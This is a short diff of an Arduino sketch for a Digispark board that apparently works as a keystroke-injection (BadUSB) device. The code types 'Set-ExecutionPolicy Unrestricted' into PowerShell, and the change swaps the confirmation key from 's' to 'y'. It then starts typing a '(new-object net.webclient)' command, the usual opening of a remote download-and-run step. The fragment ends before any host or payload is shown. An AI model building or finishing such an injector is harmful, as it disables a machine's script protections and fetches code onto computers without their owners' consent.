@@ -20,7 +20,7 @@ void setup() {
   delay(1500);
   DigiKeyboard.println("Set-ExecutionPolicy Unrestricted");
   delay(1000);
-  DigiKeyboard.println("s");
+  DigiKeyboard.println("y");
   delay(1000);
   DigiKeyboard.print("(new-object net.webclient)");
   delay(300);
